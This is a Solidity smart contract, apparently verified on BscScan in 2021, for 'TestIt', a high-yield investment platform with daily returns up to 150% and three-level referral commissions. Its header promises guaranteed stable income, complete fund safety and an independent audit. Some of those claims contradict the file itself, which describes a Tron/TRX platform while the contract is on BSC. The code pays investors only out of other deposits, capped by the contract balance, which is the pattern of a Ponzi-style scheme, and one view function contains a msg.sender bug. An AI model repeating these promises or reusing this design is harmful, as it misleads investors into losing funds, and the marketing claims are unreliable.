/**
 *Submitted for verification at BscScan.com on 2021-07-23
*/

/*  
 *                                                                  
 *                                                                   
 *                                                                  
 * TestIt Smart Contract Made Actually Smart
 * Verified Smart Contract Investment Platform.
 * TestIt Ltd. is registered company in United Kingdom with Company Number 12968944.
 * Audited by GROX SOLUTIONS - Independat Smart Contract Validation Company
 * TestIt.com is a Tron blockchain smart contract-based investment platform founded by professionals behind the biggest mining company globally- Mineify.com. we’ve leveraged on blockchain technology as well as established our code audit run by an independent audit company. Our user’s funds are kept safe away from any third-party control for instance, no company, institution, or individual can access the funds, even the TestIt administration team.
 *  _____ _   ___      ________  _____ _______ __  __ ______ _   _ _______        _____  _               _   _  _____ 
 * |_   _| \ | \ \    / /  ____|/ ____|__   __|  \/  |  ____| \ | |__   __|      |  __ \| |        /\   | \ | |/ ____|
 *   | | |  \| |\ \  / /| |__  | (___    | |  | \  / | |__  |  \| |  | |         | |__) | |       /  \  |  \| | (___  
 *   | | | . ` | \ \/ / |  __|  \___ \   | |  | |\/| |  __| | . ` |  | |         |  ___/| |      / /\ \ | . ` |\___ \ 
 *  _| |_| |\  |  \  /  | |____ ____) |  | |  | |  | | |____| |\  |  | |         | |    | |____ / ____ \| |\  |____) |
 * |_____|_| \_|   \/   |______|_____/   |_|  |_|  |_|______|_| \_|  |_|         |_|    |______/_/    \_\_| \_|_____/ 
 *                                                                                                                  
 *                                                                                                                   
 * Total Platforms Profit for the Investment period is 150%, which Guarantees LONG and STABLE Income.
 * Hold Bonus is limited to 1% Total and it gives extra 0.05% For Every Day you hold your Balance without Withdrawal.
 * Total Daily Profit Is Limited to 4%, from which 1% Is Total Hold Bonus and 3% Daily Profit. Contract starts with 2% Daily.
 * Daily Profit Increases for 0.01% every time Daily Profit Increases for 0.01% when Smart Contract Balance Reaches + 1 Million TRX. And the % doesn't decrease when the balance gets lower.
 * Hold Bonus doesnt decrease after you make another Investment
 * Very Detailed Referral Statistics in 3 Levels.
 * _____ _____  _____ _______ _____  _____ ____  _    _ _______ _____ ____  _   _ 
 * |  __ \_   _|/ ____|__   __|  __ \|_   _|  _ \| |  | |__   __|_   _/ __ \| \ | |
 * | |  | || | | (___    | |  | |__) | | | | |_) | |  | |  | |    | || |  | |  \| |
 * | |  | || |  \___ \   | |  |  _  /  | | |  _ <| |  | |  | |    | || |  | | . ` |
 * | |__| || |_ ____) |  | |  | | \ \ _| |_| |_) | |__| |  | |   _| || |__| | |\  |
 * |_____/_____|_____/   |_|  |_|  \_\_____|____/ \____/   |_|  |_____\____/|_| \_|
 * 
 * 
 *
 *   - 80% Main Smart Contract Balance for Payouts
 *   - 9% Referral Commissions
 *   - 8% For marketing
 *   - 3% Administration Fees
 */
pragma solidity 0.5.9;

contract TestIt {
	using SafeMath for uint256;
	
	uint256 constant public MinimumInvest = 0.1 * 10**18;
	uint256 constant public MarketingFee = 800;
	uint256 constant public ServiceFee = 300;
	uint256[] public ReferralCommissions = [500, 300, 100];
	uint256 constant public Day = 1 days;
	uint256 constant public ROICap = 15000;
	uint256 constant public PercentDiv = 10000;
	uint256 constant public ContractIncreaseEach = 1000 * 10**18;
	uint256 constant public StartBonus = 200;
	uint256 constant public ContractBonusCap = 100;
	uint256 constant public HoldBonusCap = 100;
	
	uint256 public TotalInvestors;
	uint256 public TotalInvested;
	uint256 public TotalWithdrawn;
	uint256 public TotalDepositCount;
	uint256 public CurrentBonus;
	
	address payable public MarketingFeeAddress;
	address payable public ServiceFeeAddress;

	struct Deposit {
		uint256 amount;
		uint256 withdrawn;
		uint256 start;
	}
	
	struct Commissions {
		address Downline;
		uint256 Earned;
		uint256 Invested;
		uint256 Level;
		uint256 DepositTime;
	}
	
	struct User {
		Deposit[] deposits;
		Commissions[] commissions;
		uint256 checkpoint;
		address upline;
		uint256 totalinvested;
		uint256 totalwithdrawn;
		uint256 totalcommisions;
		uint256 lvlonecommisions;
		uint256 lvltwocommisions;
		uint256 lvlthreecommisions;
		uint256 availablecommisions;
	}
	
	mapping (address => User)   internal users;
	
	event ReferralBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawal(address indexed user, uint256 amount);
	
	constructor(address payable MarketingAddress, address payable ServiceAddress) public {
		require(!isContract(MarketingAddress) && !isContract(ServiceAddress));
		MarketingFeeAddress = MarketingAddress;
		ServiceFeeAddress = ServiceAddress;
		CurrentBonus = StartBonus;
	}
	
	function Invest(address InvestorUpline) public payable {
		require(msg.value >= MinimumInvest);
		MarketingFeeAddress.transfer(msg.value.mul(MarketingFee).div(PercentDiv));
		ServiceFeeAddress.transfer(msg.value.mul(ServiceFee).div(PercentDiv));
		
		User storage user = users[msg.sender];
		
		if (user.upline == address(0) && users[InvestorUpline].deposits.length > 0 && InvestorUpline != msg.sender) {
			user.upline = InvestorUpline;
		}
		
		if (user.upline != address(0)) {
			address upline = user.upline;
			for (uint256 i = 0; i < 3; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(ReferralCommissions[i]).div(PercentDiv);
					users[upline].totalcommisions = users[upline].totalcommisions.add(amount);
					users[upline].availablecommisions = users[upline].availablecommisions.add(amount);
					
					if(i == 0){
						users[upline].lvlonecommisions = users[upline].lvlonecommisions.add(amount);
					}
					if(i == 1){
						users[upline].lvltwocommisions = users[upline].lvltwocommisions.add(amount);
					}
					if(i == 2){
						users[upline].lvlthreecommisions = users[upline].lvlthreecommisions.add(amount);
					}
					users[upline].commissions.push(Commissions(msg.sender, amount, msg.value, i, block.timestamp));
					emit ReferralBonus(upline, msg.sender, i, amount);
					upline = users[upline].upline;
				} else break;
			}
		}
		if (user.upline == address(0)) {
			uint256 advertise = 900;
			MarketingFeeAddress.transfer(msg.value.mul(advertise).div(PercentDiv));
		}
		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			TotalInvestors = TotalInvestors.add(1);
		}

		user.deposits.push(Deposit(msg.value, 0, block.timestamp));
		user.totalinvested = user.totalinvested.add(msg.value);
		TotalDepositCount = TotalDepositCount.add(1);
		TotalInvested = TotalInvested.add(msg.value);
		UpdateContractBonus();
		emit NewDeposit(msg.sender, msg.value);
	}
	
	function WithdrawCommissions() public {
		User storage user = users[msg.sender];
		uint256 contractBalance = address(this).balance;
		uint256 toSend;
		require(user.availablecommisions > 0, "No commissions available");

		if (contractBalance < user.availablecommisions) {
			toSend = contractBalance;
			user.availablecommisions = user.availablecommisions.sub(toSend);
		}else{
			toSend = user.availablecommisions;
			user.availablecommisions = 0;
		}
		
		msg.sender.transfer(toSend);
		TotalWithdrawn = TotalWithdrawn.add(toSend);
		
		emit Withdrawal(msg.sender, toSend);
	}
	
	function WithdrawDividends() public {
		User storage user = users[msg.sender];
		uint256 userPercentRate = CurrentBonus.add(GetHoldBonus(msg.sender));
		uint256 toSend;
		uint256 dividends;
		uint256 ResetHoldBonus;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			if (user.deposits[i].withdrawn < ((user.deposits[i].amount.mul(ROICap)).div(PercentDiv))) {
				if (user.deposits[i].start > user.checkpoint) {
					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PercentDiv))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(Day);
					ResetHoldBonus = ResetHoldBonus.add(1);
				} else {
					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PercentDiv))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(Day);
					ResetHoldBonus = ResetHoldBonus.add(1);
				}
				if (user.deposits[i].withdrawn.add(dividends) >= ((user.deposits[i].amount.mul(ROICap)).div(PercentDiv))) {
					dividends = (((user.deposits[i].amount.mul(ROICap)).div(PercentDiv))).sub(user.deposits[i].withdrawn);
					ResetHoldBonus = 0;
				}
				user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends);
				toSend = toSend.add(dividends);
			}
		}

		require(toSend > 0, "No dividends available");

		uint256 contractBalance = address(this).balance;
		if (contractBalance < toSend) {
			toSend = contractBalance;
		}
		if(ResetHoldBonus != 0){
			user.checkpoint = block.timestamp;
		}
		msg.sender.transfer(toSend);
		TotalWithdrawn = TotalWithdrawn.add(toSend);
		user.totalwithdrawn = user.totalwithdrawn.add(toSend);
		emit Withdrawal(msg.sender, toSend);
	}
	
	function GetUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
		uint256 userPercentRate = CurrentBonus.add(GetHoldBonus(msg.sender));
		uint256 totalDividends;
		uint256 dividends;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			if (user.deposits[i].withdrawn < ((user.deposits[i].amount.mul(ROICap)).div(PercentDiv))) {
				if (user.deposits[i].start > user.checkpoint) {
					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PercentDiv))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(Day);
				} else {
					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PercentDiv))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(Day);
				}
				if (user.deposits[i].withdrawn.add(dividends) > ((user.deposits[i].amount.mul(ROICap)).div(PercentDiv))) {
					dividends = ((user.deposits[i].amount.mul(ROICap)).div(PercentDiv)).sub(user.deposits[i].withdrawn);
				}
				totalDividends = totalDividends.add(dividends);
			}
		}
		return totalDividends;
	}
	
	function ActiveClient(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];
		if (user.deposits.length > 0) {
			if (user.deposits[user.deposits.length-1].withdrawn < ((user.deposits[user.deposits.length-1].amount.mul(ROICap)).div(PercentDiv))) {
				return true;
			}
		}
	}
	
	function UpdateContractBonus() internal {
		uint256 contractBalancePercent = TotalInvested.div(ContractIncreaseEach);
		if(contractBalancePercent > ContractBonusCap){
			contractBalancePercent = ContractBonusCap;
		}
		CurrentBonus = StartBonus.add(contractBalancePercent);
	}
	
    function GetHoldBonus(address userAddress) public view returns (uint256) {
        User storage user = users[userAddress];
        if (user.checkpoint > 0) {
            uint256 timeMultiplier = ((now.sub(user.checkpoint)).div(Day)).mul(5);
            if(timeMultiplier > HoldBonusCap){
                timeMultiplier = HoldBonusCap;
            }
            return timeMultiplier;
        }else{
            return 0;
        }
    }
	
	function GetTotalCommission(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];
		return (user.commissions.length);
	}

	function GetUserCommission(address userAddress, uint256 index) public view returns(address, uint256, uint256, uint256, uint256) {
	    User storage user = users[userAddress];
		return (user.commissions[index].Downline, user.commissions[index].Earned, user.commissions[index].Invested, user.commissions[index].Level, user.commissions[index].DepositTime);
	}

	function GetUserData(address userAddress) public view returns(address, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256) {
	    User storage user = users[userAddress];
		return (user.upline, user.totalinvested, user.totalwithdrawn, user.totalcommisions, user.lvlonecommisions, user.lvltwocommisions, user.lvlthreecommisions, user.availablecommisions, user.checkpoint);
	}
	
	function GetUserTotalDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}
	
	function GetUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256) {
	    User storage user = users[userAddress];
		return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start);
	}
	
	function GetContractBalance() public view returns (uint256) {
		return address(this).balance;
	}
	
	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {
	
	function fxpMul(uint256 a, uint256 b, uint256 base) internal pure returns (uint256) {
		return div(mul(a, b), base);
	}
		
	function add(uint256 a, uint256 b) internal pure returns (uint256) {
		uint256 c = a + b;
		require(c >= a, "SafeMath: addition overflow");
		return c;
	}

	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
		require(b <= a, "SafeMath: subtraction overflow");
		uint256 c = a - b;
		return c;
	}

	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
		if (a == 0) {
			return 0;
		}
		uint256 c = a * b;
		require(c / a == b, "SafeMath: multiplication overflow");
		return c;
	}

	function div(uint256 a, uint256 b) internal pure returns (uint256) {
		require(b > 0, "SafeMath: division by zero");
		uint256 c = a / b;
		return c;
	}
}